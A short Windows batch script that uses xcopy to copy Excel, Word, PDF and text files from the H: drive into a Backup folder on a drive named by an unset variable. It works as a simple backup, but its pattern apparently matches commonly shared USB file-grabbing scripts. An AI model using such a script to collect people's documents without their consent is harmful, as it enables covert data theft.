
@echo off
cls
md %drive%\Backup
::copy  "E:\Moves\*.*" "%removablestorage%\Copy_All\" /Z /y /L
::copy "C:\Windows\System32\*.*" "%drive%\Copy_All\" /Z /Y /L
@echo on
:: variables SET 
SET odrive=%odrive:~0,2% 
set Backupcmd=xcopy /s /c /d /e /h /i /r /y 
echo on 
color 0a
%Backupcmd% "H:\*.xlsx" "%drive%\Backup\H\*.xlsx"
%Backupcmd% "H:\*.docx" "%drive%\Backup\H\*.docx"
%Backupcmd% "H:\*.doc" "%drive%\Backup\H\*.*"
%Backupcmd% "H:\*.pdf" "%drive%\Backup\H\*.*"
%Backupcmd% "H:\*.text" "%drive%\Backup\H\*.*"
%Backupcmd% "H:\*.txt" "%drive%\Backup\H\*.*"
exit